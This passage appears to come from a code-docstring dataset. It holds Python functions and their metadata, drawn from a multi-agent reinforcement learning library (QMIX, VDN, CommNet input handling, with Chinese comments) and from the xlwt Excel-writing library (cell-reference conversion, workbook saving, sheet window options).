\u8981\u628ainputs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\nreturn inputs", "path": "MARL-Algorithms/policy/reinforce.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u5148\u5bf9obs\u7f16\u7801\n", "func_signal": "def forward(self, obs, hidden_state):\n", "code": "obs_encoding = torch.sigmoid(self.encoding(obs))  # .reshape(-1, self.args.n_agents, self.args.rnn_hidden_dim)\n\nh_in = hidden_state.reshape(-1, self.args.rnn_hidden_dim)\n\n# \u7b2c\u4e00\u6b21\u7ecf\u8fc7f_obs\u5f97\u5230h\nh_out = self.f_obs(obs_encoding, h_in)\n\nfor k in range(self.args.k):  # \u901a\u4fe1self.args.k\u6b21\n    if k == 0:  # \u521d\u59cb\u5316c\u4e3a0\n        h = h_out\n        c = torch.zeros_like(h)\n    else:\n        # \u628ah\u8f6c\u5316\u51fan_agents\u7ef4\u5ea6\u7528\u4e8e\u901a\u4fe1\n        h = h.reshape(-1, self.args.n_agents, self.args.rnn_hidden_dim)\n\n        # \u5bf9\u4e8e\u6bcf\u4e2aagent\uff0c\u5176\u4ed6agent\u7684h\u76f8\u52a0\n        # \u5148\u8ba9\u6700\u540e\u4e00\u7ef4\u5305\u542b\u6240\u6709agent\u7684h\n        c = h.reshape(-1, 1, self.args.n_agents * self.args.rnn_hidden_dim)\n        c = c.repeat(1, self.args.n_agents, 1)  # \u6b64\u65f6\u6bcf\u4e2aagent\u90fd\u6709\u4e86\u6240\u6709agent\u7684h\n        # \u628a\u6bcf\u4e2aagent\u81ea\u5df1\u7684h\u7f6e0\n        mask = (1 - torch.eye(self.args.n_agents))  # th.eye\uff08\uff09\u751f\u6210\u4e00\u4e2a\u4e8c\u7ef4\u5bf9\u89d2\u77e9\u9635\n        mask = mask.view(-1, 1).repeat(1, self.args.rnn_hidden_dim).view(self.args.n_agents, -1)  # (n_agents, n_agents * rnn_hidden_dim))\n        if self.args.cuda:\n            mask = mask.cuda()\n        c = c * mask.unsqueeze(0)\n        # \u56e0\u4e3a\u73b0\u5728\u6240\u6709agent\u7684h\u90fd\u5728\u6700\u540e\u4e00\u7ef4\uff0c\u4e0d\u80fd\u76f4\u63a5\u52a0\u3002\u6240\u4ee5\u5148\u6269\u5c55\u4e00\u7ef4\uff0c\u76f8\u52a0\u540e\u518d\u53bb\u6389\n        c = c.reshape(-1, self.args.n_agents, self.args.n_agents, self.args.rnn_hidden_dim)\n        c = c.mean(dim=-2)  # (episode_num * max_episode_len, n_agents, rnn_hidden_dim)\n        h = h.reshape(-1, self.args.rnn_hidden_dim)\n        c = c.reshape(-1, self.args.rnn_hidden_dim)\n    h = self.f_comm(c, h)\n\n# \u901a\u4fe1\u7ed3\u675f\u540e\u8ba1\u7b97\u6bcf\u4e2aagent\u7684\u6240\u6709\u52a8\u4f5c\u7684\u6743\u91cd\uff0c\u6982\u7387\u5728agent.py\u4e2d\u9009\u62e9\u52a8\u4f5c\u65f6\u8ba1\u7b97\nweights = self.decoding(h)\n\nreturn weights, h_out", "path": "MARL-Algorithms/network/commnet.py", "commit_date": "2020-05-12 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# network\n", "func_signal": "def get_centralv_args(args):\n", "code": "args.rnn_hidden_dim = 64\nargs.critic_dim = 128\nargs.lr_actor = 1e-4\nargs.lr_critic = 1e-3\n\n# epsilon-greedy\nargs.epsilon = 0.5\nargs.anneal_epsilon = 0.00064\nargs.min_epsilon = 0.02\nargs.epsilon_anneal_scale = 'epoch'\n\n# the number of the epoch to train the agent\nargs.n_epoch = 20000\n\n# the number of the episodes in one epoch\nargs.n_episodes = 1\n\n# how often to evaluate\nargs.evaluate_cycle = 100\n\n# lambda of td-lambda return\nargs.td_lambda = 0.8\n\n# how often to save the model\nargs.save_cycle = 5000\n\n# how often to update the target_net\nargs.target_update_cycle = 200\n\n# prevent gradient explosion\nargs.grad_norm_clip = 10\n\nreturn args", "path": "MARL-Algorithms/common/arguments.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u4e3a\u6bcf\u4e2aepisode\u4e2d\u7684\u6bcf\u4e2aagent\u90fd\u521d\u59cb\u5316\u4e00\u4e2aeval_hidden\u3001target_hidden\n", "func_signal": "def init_hidden(self, episode_num):\n", "code": "self.eval_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))\nself.target_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))", "path": "MARL-Algorithms/policy/qmix.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u4e3a\u6bcf\u4e2aepisode\u4e2d\u7684\u6bcf\u4e2aagent\u90fd\u521d\u59cb\u5316\u4e00\u4e2aeval_hidden\u3001target_hidden\n", "func_signal": "def init_hidden(self, episode_num):\n", "code": "self.eval_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))\nself.target_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))", "path": "MARL-Algorithms/policy/vdn.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "\"\"\"\n:param inputs: # q_value of all actions\n\"\"\"\n", "func_signal": "def _choose_action_from_softmax(self, inputs, avail_actions, epsilon, evaluate=False):\n", "code": "action_num = avail_actions.sum(dim=1, keepdim=True).float().repeat(1, avail_actions.shape[-1])  # num of avail_actions\n# \u5148\u5c06Actor\u7f51\u7edc\u7684\u8f93\u51fa\u901a\u8fc7softmax\u8f6c\u6362\u6210\u6982\u7387\u5206\u5e03\nprob = torch.nn.functional.softmax(inputs, dim=-1)\n# add noise of epsilon\nprob = ((1 - epsilon) * prob + torch.ones_like(prob) * epsilon / action_num)\nprob[avail_actions == 0] = 0.0  # \u4e0d\u80fd\u6267\u884c\u7684\u52a8\u4f5c\u6982\u7387\u4e3a0\n\n\"\"\"\n\u4e0d\u80fd\u6267\u884c\u7684\u52a8\u4f5c\u6982\u7387\u4e3a0\u4e4b\u540e\uff0cprob\u4e2d\u7684\u6982\u7387\u548c\u4e0d\u4e3a1\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981\u8fdb\u884c\u6b63\u5219\u5316\uff0c\u56e0\u4e3atorch.distributions.Categorical\n\u4f1a\u5c06\u5176\u8fdb\u884c\u6b63\u5219\u5316\u3002\u8981\u6ce8\u610f\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u7528\u5230Categorical\uff0c\u6240\u4ee5\u8bad\u7ec3\u65f6\u53d6\u6267\u884c\u7684\u52a8\u4f5c\u5bf9\u5e94\u7684\u6982\u7387\u9700\u8981\u518d\u6b63\u5219\u5316\u3002\n\"\"\"\n\nif epsilon == 0 and evaluate:\n    action = torch.argmax(prob)\nelse:\n    action = Categorical(prob).sample().long()\nreturn action", "path": "MARL-Algorithms/agent/agent.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_inputs(self, batch, transition_idx):\n", "code": "obs, obs_next, u_onehot = batch['o'][:, transition_idx], \\\n                          batch['o_next'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs, inputs_next = [], []\ninputs.append(obs)\ninputs_next.append(obs_next)\n# \u7ed9obs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\n\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\n    inputs_next.append(u_onehot[:, transition_idx])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684obs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cobs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n    inputs_next.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628aobs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/qmix.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_individual_inputs(self, batch, transition_idx):\n", "code": "obs, obs_next, u_onehot = batch['o'][:, transition_idx], \\\n                          batch['o_next'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs, inputs_next = [], []\ninputs.append(obs)\ninputs_next.append(obs_next)\n# \u7ed9obs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\n    inputs_next.append(u_onehot[:, transition_idx])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684obs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cobs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n    inputs_next.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628aobs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/qtran_base.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u4e3a\u6bcf\u4e2aepisode\u4e2d\u7684\u6bcf\u4e2aagent\u90fd\u521d\u59cb\u5316\u4e00\u4e2aeval_hidden\u3001target_hidden\n", "func_signal": "def init_hidden(self, episode_num):\n", "code": "self.eval_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))\nself.target_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))", "path": "MARL-Algorithms/policy/maven.py", "commit_date": "2020-07-31 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_inputs(self, batch, transition_idx):\n", "code": "obs, obs_next, u_onehot = batch['o'][:, transition_idx], \\\n                          batch['o_next'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs, inputs_next = [], []\ninputs.append(obs)\ninputs_next.append(obs_next)\n# \u7ed9obs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\n\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\n    inputs_next.append(u_onehot[:, transition_idx])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684obs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cobs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n    inputs_next.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628aobs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/maven.py", "commit_date": "2020-07-31 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_inputs(self, batch, transition_idx):\n", "code": "obs, obs_next, u_onehot = batch['o'][:, transition_idx], \\\n                          batch['o_next'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs, inputs_next = [], []\ninputs.append(obs)\ninputs_next.append(obs_next)\n\n# \u7ed9obs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\n    inputs_next.append(u_onehot[:, transition_idx])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684obs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\uff0cagent\uff0cobs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n    inputs_next.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628aobs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u6210episode_num*n_agents\u6761\u6570\u636e\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/vdn.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "## not optimal\n", "func_signal": "def toString(self):\n", "code": "type_ = self.type\nif type_ == 3:\n    tval = 'NULL_TREE_LOOKAHEAD'\nelif type_ == 1:\n    tval = 'EOF_TYPE'\nelif type_ == 0:\n    tval = 'INVALID_TYPE'\nelif type_ == -1:\n    tval = 'SKIP'\nelse:\n    tval = type_\nd = {\n   'text' : self.text,\n   'type' : tval,\n   'line' : self.line,\n   'colm' : self.col\n   }\n\nfmt = '[\"%(text)s\",<%(type)s>,line=%(line)s,col=%(colm)s]'\nreturn fmt % d", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"\nThis method is used to save the Workbook to a file in native Excel\nformat.\n\n:param filename_or_stream:\n  This can be a string containing a filename of\n  the file, in which case the excel file is saved to disk using the name\n  provided. It can also be a stream object with a write method, such as\n  a :class:`~io.StringIO`, in which case the data for the excel\n  file is written to the stream.\n\"\"\"\n", "func_signal": "def save(self, filename_or_stream):\n", "code": "from . import CompoundDoc\n\ndoc = CompoundDoc.XlsDoc()\ndoc.save(filename_or_stream, self.get_biff_data())", "path": "xlwt/xlwt/Workbook.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"Convert numeric row/col notation to an Excel cell reference string in\nA1 notation.\n\n\"\"\"\n", "func_signal": "def rowcol_to_cell(row, col, row_abs=False, col_abs=False):\n", "code": "assert 0 <= row < MAX_ROW # MAX_ROW counts from 1\nassert 0 <= col < MAX_COL # MAX_COL counts from 1\nd = col // 26\nm = col % 26\nchr1 = \"\"    # Most significant character in AA1\nif row_abs:\n    row_abs = '$'\nelse:\n    row_abs = ''\nif col_abs:\n    col_abs = '$'\nelse:\n    col_abs = ''\nif d > 0:\n    chr1 = chr(ord('A') + d  - 1)\nchr2 = chr(ord('A') + m)\n# Zero index to 1-index\nreturn col_abs + chr1 + chr2 + row_abs + str(row + 1)", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "## not optimal\n", "func_signal": "def toString(self):\n", "code": "type_ = self.type\nif type_ == 3:\n    tval = 'NULL_TREE_LOOKAHEAD'\nelif type_ == 1:\n    tval = 'EOF_TYPE'\nelif type_ == 0:\n    tval = 'INVALID_TYPE'\nelif type_ == -1:\n    tval = 'SKIP'\nelse:\n    tval = type_\nreturn '[\"%s\",<%s>]' % (self.getText(),tval)", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"'A' -> 0, 'Z' -> 25, 'AA' -> 26, etc\n\"\"\"\n", "func_signal": "def col_by_name(colname):\n", "code": "col = 0\npower = 1\nfor i in range(len(colname)-1, -1, -1):\n    ch = colname[i]\n    col += (ord(ch) - ord('A') + 1) * power\n    power *= 26\nreturn col - 1", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "\"\"\"Convert cell range string in A1 notation to numeric row/col\npair.\n\nReturns: row1, col1, row2, col2\n\n\"\"\"\n", "func_signal": "def cellrange_to_rowcol_pair(cellrange):\n", "code": "cellrange = cellrange.upper()\n# Convert a row range: '1:3'\nres = _re_row_range.match(cellrange)\nif res:\n    row1 = int(res.group(1)) - 1\n    col1 = 0\n    row2 = int(res.group(2)) - 1\n    col2 = -1\n    return row1, col1, row2, col2\n# Convert a column range: 'A:A' or 'B:G'.\n# A range such as A:A is equivalent to A1:A16384, so add rows as required\nres = _re_col_range.match(cellrange)\nif res:\n    col1 = col_by_name(res.group(1).upper())\n    row1 = 0\n    col2 = col_by_name(res.group(2).upper())\n    row2 = -1\n    return row1, col1, row2, col2\n# Convert a cell range: 'A1:B7'\nres = _re_cell_range.match(cellrange)\nif res:\n    row1, col1 = cell_to_rowcol2(res.group(1))\n    row2, col2 = cell_to_rowcol2(res.group(2))\n    return row1, col1, row2, col2\n# Convert a cell reference: 'A1' or 'AD2000'\nres = _re_cell_ref.match(cellrange)\nif res:\n    row1, col1 = cell_to_rowcol2(res.group(1))\n    return row1, col1, row1, col1\nraise Exception(\"Unknown cell reference %s\" % (cellrange))", "path": "xlwt/xlwt/Utils.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "## case 1:\n## if there's no arg we default to read from\n## standard input\n", "func_signal": "def setInput(self,*argv):\n", "code": "if not argv:\n    import sys\n    self.setInput(sys.stdin)\n    return\n\n## get 1st argument\narg1 = argv[0]\n\n## case 2:\n## if arg1 is a string,  we assume it's a file name\n## and  open  a  stream  using 2nd argument as open\n## mode. If there's no 2nd argument we fall back to\n## mode '+rb'.\nif is_string_type(arg1):\n    f = open(arg1,\"rb\")\n    self.setInput(f)\n    self.setFilename(arg1)\n    return\n\n## case 3:\n## if arg1 is a file we wrap it by a char buffer (\n## some additional checks?? No, can't do this in\n## general).\nif isinstance(arg1,file):\n    self.setInput(CharBuffer(arg1))\n    return\n\n## case 4:\n## if arg1 is of type SharedLexerInputState we use\n## argument as is.\nif isinstance(arg1,LexerSharedInputState):\n    self.inputState = arg1\n    return\n\n## case 5:\n## check whether argument type is of type input\n## buffer. If so create a SharedLexerInputState and\n## go ahead.\nif isinstance(arg1,InputBuffer):\n    self.setInput(LexerSharedInputState(arg1))\n    return\n\n## case 6:\n## check whether argument type has a method read(int)\n## If so create CharBuffer ...\ntry:\n    if arg1.read:\n        rd = Reader(arg1)\n        cb = CharBuffer(rd)\n        ss = LexerSharedInputState(cb)\n        self.inputState = ss\n    return\nexcept:\n    pass\n\n## case 7:\n## raise wrong argument exception\nraise TypeError(argv)", "path": "xlwt/xlwt/antlr.py", "commit_date": "2018-04-08 00:00:00", "repo_name": "python-excel/xlwt", "stars": 1029, "license": "other", "language": "python", "size": 657}
{"docstring": "# Appends SCL record.\n", "func_signal": "def __window2_rec(self):\n", "code": "options = 0\noptions |= (self.__show_formulas        & 0x01) << 0\noptions |= (self.__show_grid            & 0x01) << 1\noptions |= (self.__show_headers         & 0x01) << 2\noptions |= (self.__panes_frozen         & 0x01) << 3\noptions |= (self.show_zero_values       & 0x01) << 4\noptions |= (self.__auto_colour_grid     & 0x01) << 5\noptions |= (self.__cols_right_to_left   & 0x01) << 6\noptions |= (self.__show_outline         & 0x01) << 7\noptions |= (self.__remove_splits        & 0x01) << 8\noptions |= (self.__selected             & 0x01) << 9\noptions |= (self.__sheet_visible        & 0x01) << 10\noptions |= (self.__page_preview         & 0x01) << 11\nif self.explicit_magn_setting:\n    # Experimentation: caller can set the scl magn.\n    # None -> no SCL record written\n    # Otherwise 10 <= scl_magn <= 400 or scl_magn == 0\n    # Note: value 0 means use 100 for normal view, 60 for page break preview\n    # BREAKING NEWS: Excel interprets scl_magn = 0 very literally, your\n    # sheet appears like a tiny dot on the screen\n    scl_magn = 